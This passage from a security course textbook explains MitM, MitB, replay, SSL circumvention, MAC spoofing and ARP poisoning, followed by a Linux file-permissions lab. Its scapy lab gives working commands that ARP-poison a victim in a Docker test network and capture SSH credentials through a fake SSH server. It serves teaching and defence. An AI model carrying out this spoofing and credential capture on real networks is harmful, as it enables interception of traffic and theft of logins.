</ol>
</div>
</div>
</div>
</div>
</div>
<div class="sect1">
<h2 id="_attacks_wip">5. Attacks (WIP)</h2>
<div class="sectionbody">
<div class="sect2">
<h3 id="_interception_attacks">5.1. Interception Attacks</h3>
<div class="paragraph">
<p>Interception attacks rely on the ability to intercept network communications.
This may be due to the nature of the network being used or sometimes other methods may leveraged to better position the attacker.
These attacks generally involve forging fictitious messages, recording transmitted data, or altering the contents of messages while on a network.
This family of attacks places all parts of the CIA triad at risk.</p>
</div>
<div class="sect3">
<h4 id="_mitm">5.1.1. MitM</h4>
<div class="imageblock right">
<div class="content">
<img src="images/mitm.svg" alt="mitm" width="400" height="144">
</div>
</div>
<div class="paragraph">
<p>A man in the middle attack is a blanket term applied when an attacker is intercepting communication.
A typical attack involves eavesdropping and possibly modifying messages between two parties.
Encryption can be used to mitigate the attack, making it impossible for an attacker to decrypt the messages they are intercepting.
That being said, particular attention must be paid to the handshaking/key exchange protocol to be sure that an attacker does not gain access to the key(s) being used.
What follows is an example of MitM being used to intercept and modify the public key exchange:</p>
</div>
<div class="imageblock text-center">
<div class="content">
<img src="images/mitm-keys.svg" alt="mitm keys" width="500" height="192">
</div>
</div>
<div class="paragraph">
<p>In the above example the MitM allows the first message to pass unmolested, but tampers with the exchange of the public key.
By passing it&#8217;s own public key to Bob, the MitM has to ability to decrypt the messages that Bob sends and can still use Alice&#8217;s public key to re-encrypt the messages at pass them to her.
You can see how if two public keys are exchanged in this manner it would be possible to set up a MitM attack where despite encryption all messages can be seen.</p>
</div>
</div>
<div class="sect3">
<h4 id="_mitb">5.1.2. MitB</h4>
<div class="paragraph">
<p>MitB stands for man in the browser and is typically caused by a trojan installing malware that allows the attacker to intercept/modify communications between the browser and the server.
This can be used to capture data on forms, modify input, or modify the response from the server.
Often the software used in MitB attacks lays dormant until the victim browses to a targeted website.
What follows is an example of how a MitB attack can be used to modify an online banking request to send money:</p>
</div>
<div class="imageblock text-center">
<div class="content">
<img src="images/mitb.svg" alt="mitb" width="900" height="242">
</div>
</div>
<div class="paragraph">
<p>As you can see the attacker ended up with $10,000 and the victim simply thought they authorized a payment of $1,000 to someone else.
These attacks can be difficult to detect because they take place within the browser and are opportunistic.</p>
</div>
</div>
<div class="sect3">
<h4 id="_replay_attacks">5.1.3. Replay Attacks</h4>
<div class="paragraph">
<p>This family of attacks typically involves a MitM making a copy of the transmission and <em>replaying</em> it to impersonate the victim.
Logon credentials, simple hashes, and specific commands are sometimes susceptible to this type of attack.
The solution is to use timestamps, nonces, rotating keys, or a counter to make sure commands cannot be executed outside of context.</p>
</div>
<div class="sidebarblock">
<div class="content">
<div class="title">One-time Passwords</div>
<div class="paragraph">
<p>To help mitigate replay attacks, an online banking application may require that client use a one-time password (OTP) when submitting transactions.
An OTP is a frequently changing value that is known to both the client and the server.
Several one-time password schemes exist, most of which make use of a cryptographic hash function with a shared seed between client and server.
Periodically the client and server update to a new hash based on the seed and without the seed it is impossible to know what the next hash will be.
By using an OTP anyone who intercepts the traffic will not be able to perform a replay attack as the password will not be current.</p>
</div>
</div>
</div>
</div>
<div class="sect3">
<h4 id="_ssl_circumvention">5.1.4. SSL Circumvention</h4>
<div class="imageblock right">
<div class="content">
<img src="images/ssl-mitm.svg" alt="ssl mitm" width="500" height="528">
</div>
<div class="title">Figure 3. MitM preventing HTTPS upgrade and skimming passwords</div>
</div>
<div class="paragraph">
<p>If you think about the intercepted key exchange given in the above MitM example, a similar attack can allow attackers to view SSL traffic.
The attacker gives the victim a bogus certificate authority (CA) certificate which the victim installs.
This is often accomplished via a trojan.
Then the attacker places themselves in the middle of an uninitiated secure connection.
During the key exchange the attacker creates a custom certificate signed by a bogus CA for the connection between attacker and victim.
The attacker also makes an actual HTTPS connection to the service and proxies data for the victim.
All of the victims data will show up in plaintext for the attacker but the connection will appear to be secure for the victim.
This is used in the <a href="https://www.telerik.com/fiddler">Fiddler</a> debugging proxy to decrypt HTTPS traffic and is also used in some network appliances that perform deep packet inspection.</p>
</div>
<div class="paragraph">
<p>Another MitM attack on SSL is simply to maintain or downgrade to an HTTP connection with the victim and proxy data to an actual HTTPS connection with the server.
Most servers will upgrade an insecure connection, but by intercepting that exchange the attacker can continue to monitor the victim&#8217;s traffic.</p>
</div>
</div>
</div>
<div class="sect2">
<h3 id="_layer_2_attacks">5.2. Layer 2 Attacks</h3>
<div class="sect3">
<h4 id="_mac_spoofingmac_cloning">5.2.1. MAC Spoofing/MAC Cloning</h4>
<div class="paragraph">
<p>Most networks expect that a MAC address will correspond to the unique numbers on a NIC, but it is actually quite easy to change.
Virtual networking necessitates the ability to use a different MAC address and this feature is built into most modern operating systems.
MAC spoofing is when an attacker sets their MAC address to the MAC address of another machine on the network in an effort to initiate an attack.
For example, them may set themselves up as a gateway to launch a MitM attack.</p>
</div>
</div>
<div class="sect3">
<h4 id="_mac_flooding">5.2.2. MAC Flooding</h4>
<div class="paragraph">
<p>Switches are tasked with keeping track of which MAC addresses correspond to which ports on the switch.
They use this to make sure that traffic is only routed where it needs to go.
Given that MAC addresses can be changed, an attacker could flood a switch with packets from many different MAC addresses and possibly overflow the MAC-port routing table.
Some switches may default to hub-like functionality and send frames to all ports in an effort to keep traffic flowing.
This then allows an attacker to capture traffic from other machines on the network.</p>
</div>
</div>
<div class="sect3">
<h4 id="_arp_poisoning">5.2.3. ARP Poisoning</h4>
<div class="openblock float-group">
<div class="content">
<div class="imageblock left">
<div class="content">
<img src="images/arp.svg" alt="arp" width="500">
</div>
</div>
<div class="paragraph">
<p>An attacker may also use ARP packets to impersonate another machine on the network, such as a gateway router.
By repeatedly sending out ARP packets, <em>gratuitous arp</em>, redirecting packets bound for the gateway&#8217;s IP to the attackers MAC address an attacker can set up a MitM scenario.
This is particularly difficult because depending on the TTL of the ARP cache it may take up to 20 minutes for normal network operations to resume.</p>
</div>
</div>
</div>
</div>
</div>
<div class="sect2">
<h3 id="_review_5">5.3. Review</h3>
<div class="sect3">
<h4 id="_labs_5">5.3.1. Labs</h4>
<div class="openblock lab">
<div class="title">Getting Scrapy with Scapy</div>
<div class="content">
<div class="paragraph">
<p>In this lab we will use a fake SSH server, <a href="https://github.com/jaksi/sshesame">sshesame</a>, and an interactive packet manipulation program, <a href="https://scapy.net/">scapy</a>, to disrupt an ongoing SSH session between victim and server, position ourself in the middle of the traffic, and capture the username and password victim is using.</p>
</div>
<table class="tableblock frame-all grid-all right" style="width: 50%;">
<caption class="title">Table 1. IP Addresses Used</caption>
<colgroup>
<col style="width: 50%;">
<col style="width: 50%;">
</colgroup>
<thead>
<tr>
<th class="tableblock halign-left valign-top">Name</th>
<th class="tableblock halign-left valign-top">IP Address</th>
</tr>
</thead>
<tbody>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock">server</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">172.20.0.5</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock">victim</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">172.20.0.6</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock">attacker</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">172.20.0.7</p></td>
</tr>
</tbody>
</table>
<div class="paragraph">
<p>For this lab our IP addresses are configured statically and are known to the attacker.
It is also assumed that the attacker is on the local network.
Lastly victim has been poorly configured to ignore changes to the host key.
This is not entirely unreasonable as many users just ignore the warnings and clear out the known_hosts file when prompted anyway.</p>
</div>
<div class="paragraph">
<p>Start by downloading the <a href="https://github.com/rxt1077/it230/raw/main/labs/scapy.zip">scapy.zip</a> file which contains the Docker Compose configuration we will be using.
Uncompress it to a directory where you have write access.
This lab will require us to use three terminal windows/tabs: one for the <code>docker-compose up</code> command which will show the output of everything running in the background, one for the victim which will show an SSH session with the server, and one for the attacker which we will use to make the attack.</p>
</div>
<div class="imageblock text-center">
<div class="content">
<img src="images/scapy.svg" alt="scapy" width="800" height="352">
</div>
</div>
<div class="paragraph">
<p>Open three terminals and <code>cd</code> into the directory where you uncompressed the lab zip file in each of them.
There should be a <code>docker-compose.yml</code> file and <code>server</code>, <code>victim</code>, and <code>attacker</code> directories in the directory you are in.</p>
</div>
<div class="paragraph">
<p>In the first terminal run the <code>docker-compose up</code> command to build the images and run the containers:</p>
</div>
<div class="listingblock">
<div class="title">docker-compose up</div>
<div class="content">
<pre class="highlight"><code class="language-text" data-lang="text">PS C:\Users\rxt1077\it230\labs\scapy&gt; docker-compose up
Creating network "scapy_testnet" with the default driver
Creating scapy_server_1   ... done
Creating scapy_victim_1   ... done
Creating scapy_attacker_1 ... done
Attaching to scapy_victim_1, scapy_server_1, scapy_attacker_1
server_1    | &gt; Starting SSHD
server_1    | &gt;&gt; Generating new host keys
scapy_victim_1 exited with code 0
attacker_1  | INFO 2021/10/07 13:56:45 No host keys configured, using keys at "/root/.local/share/sshesame"
attacker_1  | INFO 2021/10/07 13:56:45 Host key "/root/.local/share/sshesame/host_rsa_key" not found, generating it
attacker_1  | INFO 2021/10/07 13:56:45 Host key "/root/.local/share/sshesame/host_ecdsa_key" not found, generating it
attacker_1  | INFO 2021/10/07 13:56:45 Host key "/root/.local/share/sshesame/host_ed25519_key" not found, generating it
attacker_1  | INFO 2021/10/07 13:56:45 Listening on [::]:22 <i class="conum" data-value="1"></i><b>(1)</b>
server_1    | ssh-keygen: generating new host keys: RSA DSA ECDSA ED25519
server_1    | &gt;&gt;&gt; Fingerprints for dsa host key
server_1    | 1024 MD5:a5:e6:e9:38:d2:2e:88:fd:f0:aa:a8:05:07:35:5f:18 root@a010fe3c2f3c (DSA)
server_1    | 1024 SHA256:NM7DONpt1doZp4e6WV+6WVVr+KUrh9luUSRcAhnzdyw root@a010fe3c2f3c (DSA)
server_1    | 1024 SHA512:LHfFdSk1XiAKQArH0CW+RkaKv5GgovPCH7UIQ+P4T2LbgGpCBP5aGA1V3oriYbTZWuS9TlUgDbEfTBq19AV/cA root@a010fe3c2f3c (DSA)
server_1    | &gt;&gt;&gt; Fingerprints for rsa host key
server_1    | 3072 MD5:74:44:b6:a2:74:b9:7e:1b:ba:3d:27:b8:19:3a:48:df root@a010fe3c2f3c (RSA)
server_1    | 3072 SHA256:mubm9mLNrdNDk5fyj0dghDBIbbwcVKXo23Qdv61/S/c root@a010fe3c2f3c (RSA)
server_1    | 3072 SHA512:JFQhS6trY7sNqRSwZ+t0uyBb5ddNh9qSLtBrMaa5G7xWzKHpxCuKBSDbvLk4W9JKeQftTU4293UDV9vqCcf/6w root@a010fe3c2f3c (RSA)
server_1    | &gt;&gt;&gt; Fingerprints for ecdsa host key
server_1    | 256 MD5:15:75:5f:9b:72:7c:f0:13:ea:0d:b4:47:b7:62:69:63 root@a010fe3c2f3c (ECDSA)
server_1    | 256 SHA256:4p/Afp/8C2tHn7AePdS7OHCgPxfBamdaLIUg4IJ7xx4 root@a010fe3c2f3c (ECDSA)
server_1    | 256 SHA512:NnbevqBXFkGQWIirdFsLPnX85q7q/1Y7E4i+BLHLqE3cg2aqkduBJsssyr9+G7bSvq7txvjl9SRmyRAzuDT7DQ root@a010fe3c2f3c (ECDSA)
server_1    | &gt;&gt;&gt; Fingerprints for ed25519 host key
server_1    | 256 MD5:ad:00:61:26:4d:a0:07:be:6b:8e:91:bd:f0:65:e6:14 root@a010fe3c2f3c (ED25519)
server_1    | 256 SHA256:Vl7jQulDsONglP1xbSN+J8nSfCaIER40rHhgy7z/BYg root@a010fe3c2f3c (ED25519)
server_1    | 256 SHA512:WkmvOWe6oaZ/qE1ZiA0rZAjn9H+hCDxI8NHpsjRNCalK/CgVV9+VhkzHgRTKfKTqQeE0y/Zz2GaEJGv/sapCHg root@a010fe3c2f3c (ED25519)
server_1    | WARNING: No SSH authorized_keys found!
server_1    | &gt;&gt; Unlocking root account
server_1    | WARNING: password authentication enabled.
server_1    | WARNING: password authentication for root user enabled.
server_1    | &gt;&gt; Running: /etc/entrypoint.d/changepw.sh
server_1    | Running /usr/sbin/sshd -D -e -f /etc/ssh/sshd_config
server_1    | Server listening on 0.0.0.0 port 22. <i class="conum" data-value="2"></i><b>(2)</b>
server_1    | Server listening on :: port 22.</code></pre>
</div>
</div>
<div class="colist arabic">
<table>
<tr>
<td><i class="conum" data-value="1"></i><b>1</b></td>
<td>Notice that attacker has a fake SSH server running in the background</td>
</tr>
<tr>
<td><i class="conum" data-value="2"></i><b>2</b></td>
<td>Notice that server has a legitimate SSH server running in the background</td>
</tr>
</table>
</div>
<div class="paragraph">
<p>In the second terminal run <code>docker-compose run victim bash</code> and then from the prompt we&#8217;ll SSH to server using the password "password":</p>
</div>
<div class="listingblock">
<div class="title">victim</div>
<div class="content">
<pre class="highlight"><code class="language-text" data-lang="text">PS C:\Users\rxt1077\it230\labs\scapy&gt; docker-compose run victim bash
Creating scapy_victim_run ... done
bash-5.0# ssh server
Warning: Permanently added 'server,172.20.0.5' (ECDSA) to the list of known hosts.
root@server's password: <i class="conum" data-value="1"></i><b>(1)</b>
You are now logged into 'server' (presumably from 'victim') via SSH for this assignment.
Leave this connection open while you experiment with scapy from 'attacker'.
bf9ebe42a108:~#</code></pre>
</div>
</div>
<div class="colist arabic">
<table>
<tr>
<td><i class="conum" data-value="1"></i><b>1</b></td>
<td>The password is "password"</td>
</tr>
</table>
</div>
<div class="paragraph">
<p>In the third terminal we&#8217;ll start by <em>executing</em> (recall that at this point it&#8217;s already running sshesame in the background) a BASH shell on attacker and configuring it to accept packets not only for its own IP address, but also for the server&#8217;s IP address.
Once traffic is routed to us, this will allow attacker to also respond to packets destined for 172.20.0.5.</p>
</div>
<div class="listingblock">
<div class="title">attacker</div>
<div class="content">
<pre class="highlight"><code class="language-console" data-lang="console">PS C:\Users\rxt1077\it230\labs\scapy&gt; docker-compose exec attacker bash
root@5195de3d330c:/# ip addr add 172.20.0.5 dev eth0
root@5195de3d330c:/# ip addr
1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
2: tunl0@NONE: &lt;NOARP&gt; mtu 1480 qdisc noop state DOWN group default qlen 1000
    link/ipip 0.0.0.0 brd 0.0.0.0
3: sit0@NONE: &lt;NOARP&gt; mtu 1480 qdisc noop state DOWN group default qlen 1000
    link/sit 0.0.0.0 brd 0.0.0.0
347: eth0@if348: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default
    link/ether 02:42:ac:14:00:07 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 172.20.0.7/24 brd 172.20.0.255 scope global eth0 <i class="conum" data-value="1"></i><b>(1)</b>
       valid_lft forever preferred_lft forever
    inet 172.20.0.5/32 scope global eth0 <i class="conum" data-value="2"></i><b>(2)</b>
       valid_lft forever preferred_lft forever</code></pre>
</div>
</div>
<div class="colist arabic">
<table>
<tr>
<td><i class="conum" data-value="1"></i><b>1</b></td>
<td>This is the IP we started with</td>
</tr>
<tr>
<td><i class="conum" data-value="2"></i><b>2</b></td>
<td>This is an additional IP that attacker believes it has</td>
</tr>
</table>
</div>
<div class="paragraph">
<p>Now that the attacker system is configured, we&#8217;ll start up <code>scapy</code> interactively:</p>
</div>
<div class="listingblock">
<div class="title">attacker</div>
<div class="content">
<pre class="highlight"><code class="language-text" data-lang="text">root@5195de3d330c:/# scapy
INFO: Can't import matplotlib. Won't be able to plot.
INFO: Can't import PyX. Won't be able to use psdump() or pdfdump().
INFO: No IPv6 support in kernel
INFO: Can't import python-cryptography v1.7+. Disabled WEP decryption/encryption. (Dot11)
INFO: Can't import python-cryptography v1.7+. Disabled IPsec encryption/authentication.
WARNING: IPython not available. Using standard Python shell instead.
AutoCompletion, History are disabled.

                     aSPY//YASa
             apyyyyCY//////////YCa       |
            sY//////YSpcs  scpCY//Pp     | Welcome to Scapy
 ayp ayyyyyyySCP//Pp           syY//C    | Version 2.4.5
 AYAsAYYYYYYYY///Ps              cY//S   |
         pCCCCY//p          cSSps y//Y   | https://github.com/secdev/scapy
         SPPPP///a          pP///AC//Y   |
              A//A            cyP////C   | Have fun!
              p///Ac            sC///a   |
              P////YCpc           A//A   | To craft a packet, you have to be a
       scccccp///pSP///p          p//Y   | packet, and learn how to swim in
      sY/////////y  caa           S//P   | the wires and in the waves.
       cayCyayP//Ya              pY/Ya   |        -- Jean-Claude Van Damme
        sY/PsY////YCc          aC//Yp    |
         sc  sccaCY//PCypaapyCP//YSs
                  spCPY//////YPSps
                       ccaacs
&gt;&gt;&gt;</code></pre>
</div>
</div>
<div class="paragraph">
<p>You&#8217;ll notice that scapy&#8217;s prompt is &gt;&gt;&gt;, just like python because it <em>is</em> python.
Since we&#8217;re working in python, let&#8217;s make our lives easier by defining a few simple variables:</p>
</div>
<div class="listingblock">
<div class="title">attacker</div>
<div class="content">
<pre class="highlight"><code class="language-text" data-lang="text">&gt;&gt;&gt; server_ip = "172.20.0.5" <i class="conum" data-value="1"></i><b>(1)</b>
&gt;&gt;&gt; victim_ip = "172.20.0.6"</code></pre>
</div>
</div>
<div class="colist arabic">
<table>
<tr>
<td><i class="conum" data-value="1"></i><b>1</b></td>
<td>IPv4 addresses are strings in scapy</td>
</tr>
</table>
</div>
<div class="paragraph">
<p>Now let&#8217;s see how scapy allows us to build packets.
We&#8217;ll make an Ethernet frame, with an IP packet inside it, with an ICMP echo request in that, with the data being set to our name:</p>
</div>
<div class="listingblock">
<div class="title">attacker</div>
<div class="content">
<pre class="highlight"><code class="language-text" data-lang="text">&gt;&gt;&gt; ping = Ether()/IP(dst=server_ip)/ICMP()/"Ryan Tolboom" <i class="conum" data-value="1"></i><b>(1)</b>
&gt;&gt;&gt; ping.show() <i class="conum" data-value="2"></i><b>(2)</b>
###[ Ethernet ]###
  dst       = 02:42:ac:14:00:05
  src       = 02:42:ac:14:00:07
  type      = IPv4
###[ IP ]###
     version   = 4
     ihl       = None
     tos       = 0x0
     len       = None
     id        = 1
     flags     =
     frag      = 0
     ttl       = 64
     proto     = icmp
     chksum    = None
     src       = 172.20.0.7
     dst       = 172.20.0.5
     \options   \
###[ ICMP ]###
        type      = echo-request
        code      = 0
        chksum    = None
        id        = 0x0
        seq       = 0x0
        unused    = ''
###[ Raw ]###
           load      = 'Ryan Tolboom'

&gt;&gt;&gt; result = srp1(ping) <i class="conum" data-value="3"></i><b>(3)</b>
Begin emission:
Finished sending 1 packets.
.*
Received 2 packets, got 1 answers, remaining 0 packets
&gt;&gt;&gt; result.show()
###[ Ethernet ]###
  dst       = 02:42:ac:14:00:07
  src       = 02:42:ac:14:00:05
  type      = IPv4
###[ IP ]###
     version   = 4
     ihl       = 5
     tos       = 0x0
     len       = 40
     id        = 62086
     flags     =
     frag      = 0
     ttl       = 64
     proto     = icmp
     chksum    = 0x301a
     src       = 172.20.0.5
     dst       = 172.20.0.7
     \options   \
###[ ICMP ]###
        type      = echo-reply
        code      = 0
        chksum    = 0xea7a
        id        = 0x0
        seq       = 0x0
        unused    = ''
###[ Raw ]###
           load      = 'Ryan Tolboom'

&gt;&gt;&gt; server_mac = result[0][0].src
&gt;&gt;&gt; server_mac
'02:42:ac:14:00:05'</code></pre>
</div>
</div>
<div class="colist arabic">
<table>
<tr>
<td><i class="conum" data-value="1"></i><b>1</b></td>
<td>Scapy uses the '/' operator to nest protocols.
This is my name in an ICMP packet, in an IP packet, in an Ethernet frame.
Be sure you use your own name!</td>
</tr>
<tr>
<td><i class="conum" data-value="2"></i><b>2</b></td>
<td>The <code>show()</code> command prints out packets in detail</td>
</tr>
<tr>
<td><i class="conum" data-value="3"></i><b>3</b></td>
<td>The <code>srp1()</code> function sends and receives <em>one</em> packet at Layer 2</td>
</tr>
</table>
</div>
<div class="paragraph">
<p>Notice how we use this to capture the server&#8217;s MAC address and save it in the <code>server_mac</code> variable.</p>
</div>
<div class="admonitionblock important deliverable">
<table>
<tr>
<td class="icon">
<i class="fa icon-important" title="Important"></i>
</td>
<td class="content">
<div class="paragraph">
<p>Take a screenshot of your scapy session at this point showing that you completed an ICMP echo request/response with your name in it.</p>
</div>
</td>
</tr>
</table>
</div>
<div class="paragraph">
<p>We can also determine MAC addresses at Layer 2 with an ARP "who-has" request.
Let&#8217;s craft and send a broadcast ethernet frame with an ARP "who-has" request for the victims&#8217;s IP address.
The result will tell use what the victim&#8217;s MAC address is:</p>
</div>
<div class="listingblock">
<div class="title">attacker</div>
<div class="content">
<pre class="highlight"><code class="language-text" data-lang="text">&gt;&gt;&gt; whohas = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=victim_ip)
&gt;&gt;&gt; result = srp1(whohas)
Begin emission:
Finished sending 1 packets.
*
Received 1 packets, got 1 answers, remaining 0 packets
&gt;&gt;&gt; result.show()
###[ Ethernet ]###
  dst       = 02:42:ac:14:00:07
  src       = 02:42:ac:14:00:06 <i class="conum" data-value="1"></i><b>(1)</b>
  type      = ARP
###[ ARP ]###
     hwtype    = 0x1
     ptype     = IPv4
     hwlen     = 6
     plen      = 4
     op        = is-at
     hwsrc     = 02:42:ac:14:00:06
     psrc      = 172.20.0.6
     hwdst     = 02:42:ac:14:00:07
     pdst      = 172.20.0.7

&gt;&gt;&gt; victim_mac = result[0].src</code></pre>
</div>
</div>
<div class="colist arabic">
<table>
<tr>
<td><i class="conum" data-value="1"></i><b>1</b></td>
<td>This is my MAC address of victim, but yours may be different!</td>
</tr>
</table>
</div>
<div class="paragraph">
<p>This is how an ARP exchange is supposed to work.
We broadcast out asking what MAC we should use for a certain IP and we get a response <em>from the person who legitimately has that MAC and IP</em>.</p>
</div>
<div class="paragraph">
<p>We have everything we need to create an ARP packet telling the victim to send traffic to us when they are trying to access servers IP:</p>
</div>
<div class="listingblock">
<div class="title">attacker</div>
<div class="content">
<pre class="highlight"><code class="language-text" data-lang="text">&gt;&gt;&gt; victim_ip, victim_mac, server_ip, server_mac
('172.20.0.6', '02:42:ac:14:00:06', '172.20.0.5', '02:42:ac:14:00:05')</code></pre>
</div>
</div>
<div class="paragraph">
<p>Now let&#8217;s make and view an evil ARP packet:</p>
</div>
<div class="listingblock">
<div class="title">attacker</div>
<div class="content">
<pre class="highlight"><code class="language-text" data-lang="text">&gt;&gt;&gt; bad_arp = ARP(op=2, pdst=victim_ip, psrc=server_ip, hwdst=victim_mac)
&gt;&gt;&gt; bad_arp
&lt;ARP  op=is-at psrc=172.20.0.5 hwdst=02:42:ac:14:00:06 pdst=172.20.0.6 |&gt;</code></pre>
</div>
</div>
<div class="paragraph">
<p>This packet posits itself as coming from the server, it is aimed at the victim in both IP and MAC, but the MAC address that will be used to send it is ours (by default, we don&#8217;t specify with <code>hwsrc</code>).
This means the victim will update their ARP cache such that frames destined for server go to attacker.
This effectively reroutes all layer 2 traffic that was going to the server from the victim.</p>
</div>
<div class="paragraph">
<p>Go ahead an send that ARP packet:</p>
</div>
<div class="listingblock">
<div class="title">attacker</div>
<div class="content">
<pre class="highlight"><code class="language-text" data-lang="text">&gt;&gt;&gt; send(bad_arp)
.
Sent 1 packets.</code></pre>
</div>
</div>
<div class="paragraph">
<p>Now go back to the victim terminal with the SSH connection to server and try typing something.
As soon as SSH has to send data, you will get a broken pipe error and the connection will drop.
Faced with such a problem, what do you think most users will do?
Probably try to reconnect, let&#8217;s try that too.
Remember the password is "password".</p>
</div>
<div class="listingblock">
<div class="title">victim</div>
<div class="content">
<pre class="highlight"><code class="language-text" data-lang="text">You are now logged into 'server' (presumably from 'victim') via SSH for this assignment.
Leave this connection open while you experiment with scapy from 'attacker'.
bf9ebe42a108:~# client_loop: send disconnect: Broken pipe <i class="conum" data-value="1"></i><b>(1)</b>
bash-5.0# ssh server
Warning: Permanently added 'server,172.20.0.5' (ECDSA) to the list of known hosts.
root@server's password:
#</code></pre>
</div>
</div>
<div class="colist arabic">
<table>
<tr>
<td><i class="conum" data-value="1"></i><b>1</b></td>
<td>This happened when they tried to type something right after we sent the malicious ARP</td>
</tr>
</table>
</div>
<div class="paragraph">
<p>Wait, that prompt looks a little different and where&#8217;s the message about staying logged in?
It turns out the victim actually signed into our fake SSH server and their username and password were logged!
Take a look at the output from the terminal running <code>docker-compose up</code>, you&#8217;ll see the credentials entered:</p>
</div>
<div class="listingblock">
<div class="title">docker-compose up terminal</div>
<div class="content">
<pre class="highlight"><code class="language-text" data-lang="text">attacker_1  | 2021/10/07 01:21:41 [172.20.0.6:60252] authentication for user "root" with password "password" accepted</code></pre>
</div>
</div>
<div class="admonitionblock important deliverable">
<table>
<tr>
<td class="icon">
<i class="fa icon-important" title="Important"></i>
</td>
<td class="content">
<div class="qlist qanda">
<ol>
<li>
<p><em>How would you create an ARP packet in scapy to reverse the change you made previously and fix the route?</em></p>
<p></p>
</li>
<li>
<p><em>Would using keys instead of passwords help prevent this kind of attack? Why or why not?</em></p>
<p></p>
</li>
<li>
<p><em>How would <a href="https://www.ssh.com/academy/ssh/host-key">managing host keys correctly</a> prevent this kind of attack?</em></p>
<p></p>
</li>
</ol>
</div>
</td>
</tr>
</table>
</div>
<div class="paragraph">
<p>To stop the running containers, you can type Ctrl-C in the terminal running <code>docker-compose up</code>, exit out of the victim, and exit out of the attacker.</p>
</div>
</div>
</div>
</div>
<div class="sect3">
<h4 id="_questions_5">5.3.2. Questions</h4>
<div class="qlist qanda">
<ol>
<li>
<p><em>What can MAC address spoofing allow an attacker to do? What steps can be taken to mitigate this risk?</em></p>
<p></p>
</li>
<li>
<p><em>What is the difference between horizontal and vertical privilege escalation? Give an example of each.</em></p>
<p></p>
</li>
<li>
<p><em>What is XSS and how can it be used in an attack?</em></p>
<p></p>
</li>
</ol>
</div>
</div>
</div>
</div>
</div>
<div class="sect1">
<h2 id="_solutions_wip">6. Solutions (WIP)</h2>
<div class="sectionbody">

</div>
</div>
<div class="sect1">
<h2 id="_permissions_wip">7. Permissions (WIP)</h2>
<div class="sectionbody">
<div class="sect2">
<h3 id="_review_6">7.1. Review</h3>
<div class="sect3">
<h4 id="_labs_6">7.1.1. Labs</h4>
<div class="openblock lab">
<div class="title">Linux File Permissions</div>
<div class="content">
<div class="paragraph">
<p>In this lab we are going to explore UNIX style file permissions and determine what they can do and why they are limited.
Finally we will see how Linux ACLs provide more flexibility in assigning permissions.</p>
</div>
<div class="paragraph">
<p>We will be working in a vanilla Ubuntu container and installing software and adding users manually.
Let&#8217;s start up the container, install the packages we need, and add some users to work with:</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="highlight"><code class="language-text" data-lang="text">C:\Users\rxt1077\it230\docs&gt;docker run -it ubuntu bash
root@11ce9e5ee80e:/# apt-get update
&lt;snip&gt;
root@11ce9e5ee80e:/# apt-get install acl
Reading package lists... Done
Building dependency tree
Reading state information... Done
The following NEW packages will be installed:
  acl
0 upgraded, 1 newly installed, 0 to remove and 4 not upgraded.
Need to get 37.8 kB of archives.
After this operation, 197 kB of additional disk space will be used.
Get:1 http://archive.ubuntu.com/ubuntu focal/main amd64 acl amd64 2.2.53-6 [37.8 kB]
Fetched 37.8 kB in 0s (94.1 kB/s)
debconf: delaying package configuration, since apt-utils is not installed
Selecting previously unselected package acl.
(Reading database ... 4127 files and directories currently installed.)
Preparing to unpack .../acl_2.2.53-6_amd64.deb ...
Unpacking acl (2.2.53-6) ...
Setting up acl (2.2.53-6) ...
root@11ce9e5ee80e:/# useradd alice
root@11ce9e5ee80e:/# useradd bob
root@11ce9e5ee80e:/# useradd carol
root@11ce9e5ee80e:/# useradd dave</code></pre>
</div>
</div>
<div class="paragraph">
<p>Traditional UNIX file permissions support user and group ownership of a file.
Rread, write, and execute permissions for a file can be set for the user, group, or others.
You can view the permissions of a file with the <code>ls -l</code> command.
Let&#8217;s make home directories for alice, bob, and carol and view the default permissions:</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="highlight"><code class="language-text" data-lang="text">root@11ce9e5ee80e:/# cd home
root@11ce9e5ee80e:/home# mkdir alice bob carol
root@11ce9e5ee80e:/home# ls -l
total 12
drwxr-xr-x 2 root root 4096 Oct 28 01:28 alice
drwxr-xr-x 2 root root 4096 Oct 28 01:28 bob
drwxr-xr-x 2 root root 4096 Oct 28 01:28 carol</code></pre>
</div>
</div>
<div class="paragraph">
<p>The text <code>drwxr-xr-x</code> tells us that these files are directories, the owner has read/write/execute permission, the group has read/execute permission, and other users have read/execute permission.
It is important to note that execute permissions are required for viewing the contents of a directory.</p>
</div>
<div class="paragraph">
<p>Files owners and a groups are set with the <code>chown</code> command, following the format <code>chown &lt;user&gt;.&lt;group&gt; &lt;filename&gt;</code>.
Let&#8217;s try to use this command to make the home directories of alice, bob, and carol private:</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="highlight"><code class="language-text" data-lang="text">root@11ce9e5ee80e:/home# chown alice.alice alice
root@11ce9e5ee80e:/home# chown bob.bob bob
root@11ce9e5ee80e:/home# chown carol.carol carol
root@11ce9e5ee80e:/home# ls -l
total 12
drwxr-xr-x 2 alice alice 4096 Oct 28 01:28 alice
drwxr-xr-x 2 bob   bob   4096 Oct 28 01:28 bob
drwxr-xr-x 2 carol carol 4096 Oct 28 01:28 carol</code></pre>
</div>
</div>
<div class="paragraph">
<p>When a user is added to a UNIX system with the <code>useradd</code> command a group with their name is created.
This allows us to pass a group to <code>chown</code> that only they will have access to.
While this is a good start, others still have the ability to read and execute these directories, meaning <em>anyone</em> can view the contents.
To prove this, lets assume the role of dave and try doing an <code>ls</code> on each of the directories:</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="highlight"><code class="language-text" data-lang="text">root@11ce9e5ee80e:/home# su dave <i class="conum" data-value="1"></i><b>(1)</b>
$ ls alice
